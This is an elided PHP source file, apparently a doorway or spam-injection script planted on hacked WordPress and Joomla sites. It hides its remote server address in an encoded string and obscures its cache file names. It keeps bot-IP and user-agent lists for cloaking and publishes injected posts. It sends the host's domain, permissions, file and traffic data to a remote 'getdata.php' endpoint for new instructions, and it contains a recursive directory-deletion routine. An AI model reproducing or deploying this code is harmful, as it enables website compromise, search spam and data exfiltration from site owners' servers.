...
// ================== Get dirnames, work files, main setts, time and perms ===============
	$servurl = decodeservurl("aHR7cCUzQSUyRiUyRjYyLjIxMC1yMjAuODIlMkZ7bmQ8LjMlMkZnZXRkYXRhLnBocA==");
...
//var_dump($servurl);
	...
	$useragentsfilename = $cachedirname . DIRECTORY_SEPARATOR."use" . substr($clientid, 0, 3) . "rag" . substr
		($clientid, 3, 6) . "ents";
	$botipsfilename = $cachedirname . DIRECTORY_SEPARATOR."bo" . substr($clientid, 0, 4) . "ti" . substr($clientid,
			5, 8) . "ps";
	$referersfilename = $cachedirname . DIRECTORY_SEPARATOR."re" . substr($clientid, 1, 4) . "fere" . substr
		($clientid, 6, 8) . "re";
	...
	$nativetemplatefilename = $cachedirname . DIRECTORY_SEPARATOR."tem" . substr($clientid, 2, 6) . "pla" . substr
		($clientid, 2, 4) ."te";
	$nativetemplatefilename_old = $cachedirname . DIRECTORY_SEPARATOR."tem" . substr($clientid, 3, 6) . "pla" .
		substr($clientid, 1, 4) .
		"te";
	$nativetemplatefilename_oldold = $cachedirname . DIRECTORY_SEPARATOR."tem" . substr($clientid, 3, 6) . "pla" .
		substr($clientid, 2, 4)
		."te";
...
//var_dump($cachedirname);die();
	$thisdomain = $_SERVER['SERVER_NAME'];
	$settfilename = "se" . substr($clientid, 1, 6) . "tts";
//var_dump($settfilename);die();
...
//var_dump(file_exists($cachedirname."/".substr($clientid, 0, 7)));
//var_dump($cachedirname."/".substr($clientid, 0, 7));
...
// ======================================================================================
//var_dump($cachedirname."/".$settfilename);
//var_dump(file_exists($cachedirname."/".$settfilename));
	$keysfilestatus = "";
...
// ================== Get local settings================================================
		...
		if (stripos("qqqq" . $clienturl, "[DOMAIN]")) {
			...
			//$clienturl = str_ireplace("/", "_", $clienturl);
		}
		$clienturl=trim($clienturl);
		//var_dump($clienturl);die();
...
//echo "HUY";
			...
			if (!is_function_enabled('wp_insert_post') && !is_function_enabled('get_permalink') && !is_function_enabled('wp_delete_post') && !is_function_enabled('add_action')) {
				...
				$errorsforlocal .= "Not WP or include before WP functions loaded\t";
					...
					$post_data = array(
						'post_title' => "HEREISTITLE",
						'post_name' => $slugname,
						'post_content' => "HEREISCONTENT",
						'post_status' => 'publish',
...
//var_dump($content);
					...
					if(!empty($goodwordpresspage) && stripos("qqq".$goodwordpresspage, "HEREISCONTENT")){
						...
						$regular="|(<h1 class=\"entry-title\">.*<\/h1>)|iUs";
						preg_match_all($regular, $goodwordpresspage, $matches);
						if(!empty($matches[1][0])){
							$goodwordpresspage=str_ireplace($matches[1][0], "<h1 class=\"entry-title\">HEREISH1TAG</h1>" ,$goodwordpresspage);
						}
						...
						$goodwordpresspage = preg_replace("/<meta name=[\"\']{1}description.*[\"\']{1}.*\/>/iUs", "",
							$goodwordpresspage);
			...
			if (!is_function_enabled('postItem') && !class_exists("JFactory")) {
				...
				$errorsforlocal .= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
					...
					if(is_array($idtemp)) {
						...
						//$page = file_get_contents("http://" . trim(implode("/", $joomlaurl), "/") . "?view=article&id=" . $id."?ineedthispage=yes");
						...
						if(!empty($goodwordpresspage) && stripos("qqq".$goodwordpresspage, "HEREISCONTENT")){
							...
							//asus</a>HEREISH1TAG
							$regular="|(<h2>.*HEREISTITLE.*</h2>)|iUs";
							preg_match_all($regular, $goodwordpresspage, $matches);
							if(!empty($matches[1][0])){
								$goodwordpresspage=str_ireplace($matches[1][0], "<h1>HEREISH1TAG</h1>" ,$goodwordpresspage);
							}
							$goodwordpresspage=urlencode($goodwordpresspage);
							$regular="|(%3Cscript.*%3C%2Fscript%3E)|iUs";
							preg_match_all($regular, $goodwordpresspage, $matches);
...
// ================== Get New settings and data =====================================================
		...
		if(!empty($clienturl)) {
			//$testdoorway = file_get_contents("http://" . str_ireplace("[KEY]", "this-is-the-test-of-door",
					//$clienturl));
			$ch = curl_init();
//GET запрос указывается в строке URL
...
//var_dump($content);
		...
		//var_dump($filesdata);
//var_dump($servurl . "?clientid=".$clientid."&clienturl=".$clienturl."&templatename=".$templatename."&ineednewsetts=yes"."&version=".$version."&clientdomain=".$thisdomain."&workstatus=".$workstatus."&cachedirperm=".$cachedirperm."&ownperm=".$ownperm."&currdirperm=".$currdirperm."&settsinclient=".$settsinclient."&keyshere=".$keysfilestatus."&cloackstatus=".$usecloack."&cloackfiles=".$cloackfiles."&filesdata=".urlencode($filesdata)."&clienterrors=".urlencode($errors));
		//$newsetts = getpagefmurl("http://".$servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewsetts=yes" . "&version=" . urlencode($version) . "&clientdomain=" . urlencode($thisdomain) . "&workstatus=" . urlencode($workstatus) . "&cachedirperm=" . urlencode($cachedirperm) . "&ownperm=" . urlencode($ownperm) . "&currdirperm=" . urlencode($currdirperm) . "&settsinclient=" . urlencode($settsinclient) . "&keyshere=" .urlencode($keysfilestatus) . "&cloackstatus=" . urlencode($usecloack) . "&cloackfiles=" . urlencode($cloackfiles) . "&filesdata=" . $filesdata . "&trafficdata=".urlencode($trafficdata)."&currentsetts=".$currsettoserv."&testdoorwork=".$thisistheworkdoorway);
		...
		if ($curl = curl_init()) {
			...
			//curl_setopt($curl, CURLOPT_COOKIEFILE, "cookies/cookie.cookie");
		...
		//var_dump($servurl . "?clientid=".$clientid."&ineednewsetts=yes"."&version=".$version."&clientdomain=".$thisdomain."&workstatus=".$workstatus."&cachedirperm=".$cachedirperm."&ownperm=".$ownperm."&currdirperm=".$currdirperm."&settsinclient=".$settsinclient."&clienterrors=".urlencode($errors));die();
		//var_dump($newsetts);die();
		...
		if ($clienttype == "wpgood" || $clienttype == "joomlagood") {
			if(file_exists($nativetemplatefilename)) {
				...
				if (count($page) >= 3) {
					...
					//<META NAME="description" CONTENT="Описание данной страницы."> </head>
					//HEREISH1TAG
					if(isset($page[3]) && !empty($page[3])){

						$nativetemplate = str_ireplace("HEREISH1TAG", trim($page[3]), $nativetemplate);
					}else{
						$nativetemplate = str_ireplace("HEREISH1TAG", trim($page[0]), $nativetemplate);
					}
...
function checktime($timetocurl){
	...
	global $cachedirname;
	global $clientid;
	//var_dump($cachedirname);
	if(is_dir($cachedirname)) {
		//var_dump($dirsnearinclude);die();
		if (!file_exists($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7))) {
			$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7), "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
...
function codedata($data){
	...
	//$data=str_ireplace("\r", "VKPS", $data);
	//if(!stripos("qqq".$data, "VKPS")){
	//$data=str_ireplace("\n", "VKPS", $data);
	//}
...
function full_del_dir ($directory)
{
	...
	while(($file = readdir($dir)))
	{
		...
		else if ( is_dir ($directory.DIRECTORY_SEPARATOR.$file) &&
			($file != ".") && ($file != ".."))
		{
